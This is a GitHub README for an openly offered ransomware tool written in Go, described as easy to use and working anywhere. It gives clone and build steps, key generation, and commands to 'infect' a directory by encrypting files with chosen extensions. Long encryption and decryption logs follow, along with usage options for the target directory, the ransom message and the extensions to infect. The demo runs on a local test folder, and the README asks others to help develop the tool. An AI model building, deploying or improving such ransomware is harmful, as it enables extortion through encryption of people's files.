<p align="center">
  <a href="" rel="noopener">
 <img width=200px height=200px src="./static/icon.png" alt="Project logo" ></a>
 <br>

</p>

<h3 align="center">Ransomware</h3>

<div align="center">

[![Status](https://img.shields.io/badge/status-active-success.svg)]()
[![GitHub Issues](https://img.shields.io/github/issues/da-huin/ransomware.svg)](https://github.com/da-huin/ransomware/issues)
[![GitHub Pull Requests](https://img.shields.io/github/issues-pr/da-huin/ransomware.svg)](https://github.com/da-huin/ransomware/pulls)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](/LICENSE)


</div>

---

<p align="center"> 
    <br> This project is an easy-to use ransomware made in go language. It works anywhere.
</p>

## 📝 Table of Contents

- [About](#about)
- [Getting Started](#getting_started)
- [Usage](#usage)
- [Acknowledgments](#acknowledgement)

## 🏁 Getting Started <a name = "getting_started"></a>

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See [deployment](#deployment) for notes on how to deploy the project on a live system.

### Prerequisites

#### install go language from [HERE.](https://golang.org/)

### 🚀 Tutorial

1. **Clone git with the command below.**

	```bash
	git clone https://github.com/da-huin/ransomware
	```

1. **Go to the cloned folder in `console` or `bash`.**

1. **Build with the command below.**
	
	```bash
	cd ransomware
	go build -o ../test/
	cd ..
	```

1. **Check the folders to be infected.**

	path: `your_cloned_directory_path/test/area`
	```
	./Desktop:
	bert.pdf  cnn.pdf  cs231n_lecture10.pdf  rnn-lstm.pdf

	./Documents:

	./Downloads:
	Everything-1.4.1.986.x86.zip

	./Music:
	'A Call Is Upon Us - The 126ers.mp3'
	'Doctor Momentum - Slynk.mp3'
	'Earth Bound - Slynk.mp3'
	'Golden Empire - The 126ers.mp3'
	'Heads Up - The 126ers.mp3'
	'No.8 Requiem - Esther Abrami.mp3'
	'Rage - The 126ers.mp3'
	'See You On The Otherside - The 126ers.mp3'
	'Stars Align - The 126ers.mp3'
	'The Jam - Slynk & Mr Stabalina.mp3'
	'Warships - The 126ers.mp3'
	'X Ray Vision - Slynk.mp3'

	./Pictures:
	ara-3601194_640.jpg         polynesia-3021072_640.jpg
	elephant-2870777_640.jpg    sea-2361247_640.jpg
	fallow-deer-984573_640.png  sparkler-677774_640.jpg
	iceland-1979445_640.png     summerfield-336672_640.jpg
	man-1246233_640.jpg         train-1728537_640.jpg

	./Videos:
	'Beach - 42894.mp4'  'Cave - 45340.mp4'  'Nature - 31377.mp4'
	```
1. **Move test directory with the command below.**

	```bash
	cd test
	```

1. **Keygen with the command below.**

	* public key require encryption, private key require decryption.

	* if your os is not windows, extension isn't exe.

	```bash
	ransomware.exe -kind keygen
	```
	
	Execution result:
	```
	public.key and private.key generated.
	```

1. **Infect with the command below.**

	```bash
	ransomware.exe -kind encrypt -area ./area -keypath public.key .jpg .txt .mp3
	```
	
	Execution result:
	```
	walking ... C:\Projects\workspace\ransomware\test\area
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Desktop\bert.pdf
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Desktop\cnn.pdf
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Desktop\cs231n_lecture10.pdf
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Desktop\rnn-lstm.pdf
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Downloads\Everything-1.4.1.986.x86.zip
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\A Call Is Upon Us - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Doctor Momentum - Slynk.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Earth Bound - Slynk.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Golden Empire - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Heads Up - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\No.8 Requiem - Esther Abrami.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Rage - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\See You On The Otherside - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Stars Align - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\The Jam - Slynk & Mr Stabalina.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\Warships - The 126ers.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Music\X Ray Vision - Slynk.mp3
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\ara-3601194_640.jpg
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\elephant-2870777_640.jpg
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Pictures\fallow-deer-984573_640.png
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Pictures\iceland-1979445_640.png
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\man-1246233_640.jpg
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\polynesia-3021072_640.jpg
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\sea-2361247_640.jpg
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\sparkler-677774_640.jpg
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\summerfield-336672_640.jpg
	[ENCRYPTED]  C:\Projects\workspace\ransomware\test\area\Pictures\train-1728537_640.jpg
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Videos\Beach - 42894.mp4
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Videos\Cave - 45340.mp4
	[PASSED - EXT]  C:\Projects\workspace\ransomware\test\area\Videos\Nature - 31377.mp4
	encrypted.
	```

1. **Check the infected folder.**

	path: `your_cloned_directory_path/test/area`

1. **Decrypt with the command below.**

	```bash
	ransomware.exe -kind decrypt -area ./area -keypath private.key
	```

	Execution result:
	```
	[PASSED] C:\Projects\workspace\ransomware\test\area\Desktop\bert.pdf
	[PASSED] C:\Projects\workspace\ransomware\test\area\Desktop\cnn.pdf
	[PASSED] C:\Projects\workspace\ransomware\test\area\Desktop\cs231n_lecture10.pdf
	[PASSED] C:\Projects\workspace\ransomware\test\area\Desktop\rnn-lstm.pdf
	[PASSED] C:\Projects\workspace\ransomware\test\area\Downloads\Everything-1.4.1.986.x86.zip
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\A Call Is Upon Us - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Doctor Momentum - Slynk.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Earth Bound - Slynk.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Golden Empire - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Heads Up - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\No.8 Requiem - Esther Abrami.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Rage - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\See You On The Otherside - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Stars Align - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\The Jam - Slynk & Mr Stabalina.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\Warships - The 126ers.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Music\X Ray Vision - Slynk.mp3
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\ara-3601194_640.jpg
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\elephant-2870777_640.jpg
	[PASSED] C:\Projects\workspace\ransomware\test\area\Pictures\fallow-deer-984573_640.png
	[PASSED] C:\Projects\workspace\ransomware\test\area\Pictures\iceland-1979445_640.png
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\man-1246233_640.jpg
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\polynesia-3021072_640.jpg
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\sea-2361247_640.jpg
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\sparkler-677774_640.jpg
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\summerfield-336672_640.jpg
	[DECRYPTED] C:\Projects\workspace\ransomware\test\area\Pictures\train-1728537_640.jpg
	[PASSED] C:\Projects\workspace\ransomware\test\area\Videos\Beach - 42894.mp4
	[PASSED] C:\Projects\workspace\ransomware\test\area\Videos\Cave - 45340.mp4
	[PASSED] C:\Projects\workspace\ransomware\test\area\Videos\Nature - 31377.mp4	
	```

## 🎈 Usage <a name="usage"></a>

* `kind`: str
	
	Select one of the values: encrypt | decrypt | keygen.

* `keypath`: str

	Path of private or public key.

* `area`: str

	Directory path to infect.

* `message`: str (default "hello")

	Messages to be written to the infected file. 

* `tails`: ...

	List of extensions to be infected
	
	```
	ransomware.exe ... -message=hello .txt .pdf .png .jpg
	```

## 🎉 Acknowledgements <a name = "acknowledgement"></a>

- Title icon made by [Freepik](https://www.flaticon.com/kr/authors/freepik).

- If you have a problem. please make [issue](https://github.com/da-huin/ransomware/issues).

- Please help develop this project 😀

- Thanks for reading 😄
